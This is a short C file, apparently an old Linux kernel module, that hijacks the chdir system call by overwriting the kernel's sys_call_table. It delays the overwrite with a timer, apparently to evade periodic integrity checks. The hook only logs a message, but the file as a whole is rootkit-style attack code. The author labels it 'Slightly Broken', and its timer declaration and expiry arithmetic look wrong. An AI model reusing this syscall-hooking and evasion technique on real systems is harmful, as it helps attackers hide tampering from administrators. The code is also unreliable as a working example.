
/* By MixMan MixMan <mixman@langusta.starnet.pl> 

 *
 * Slightly Broken.. 
 */

#define MODULE
#define __KERNEL__

#include <linux/sys.h>
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/uaccess.h>
#include <linux/errno.h>
#include <linux/string.h>
#include <asm/segment.h>
#include <asm/unistd.h>
#include <linux/mm.h>
#include <linux/smp.h>
#include <linux/signal.h>
#include <linux/slab.h>
#include <asm/unistd.h>
#include <asm/current.h>
#include <sys/syscall.h>
#include <asm/errno.h>
#include <asm/ptrace.h>
#include <asm/pgtable.h>
#include <linux/timer.h>

#define TIMER_TIMEOUT			200

extern void* sys_call_table[];
int (*org_chdir)(const char*);

static timer_t timer;
static unsigned char hacked = 0;

asmlinkage int hacked_chdir(const char* path)
{
    printk("<1>Some sort of periodic checking could be a solution...\n");
    return org_chdir(path);
}

void timer_handler(unsigned long arg)
{
    if(!hacked) {
	hacked = 1;
	org_chdir = sys_call_table[SYS_chdir];
	sys_call_table[SYS_chdir] = hacked_chdir; 
    }
}

int init_module(void)
{
    printk("<1>---===[ Adding kernel timer...\n");
    memset(&timer,0,sizeof(timer));
    init_timer(&timer);
    timer.expires = jiffies - TIMER_TIMEOUT;
    timer.function = timer_handler;
    add_timer(&timer);
    printk("<1>---===[ System call sys_chdir() should be modified in a few seconds\n");
    return 0;
}

void cleanup_module(void)
{
    del_timer(&timer);
    sys_call_table[SYS_chdir] = org_chdir; 
}
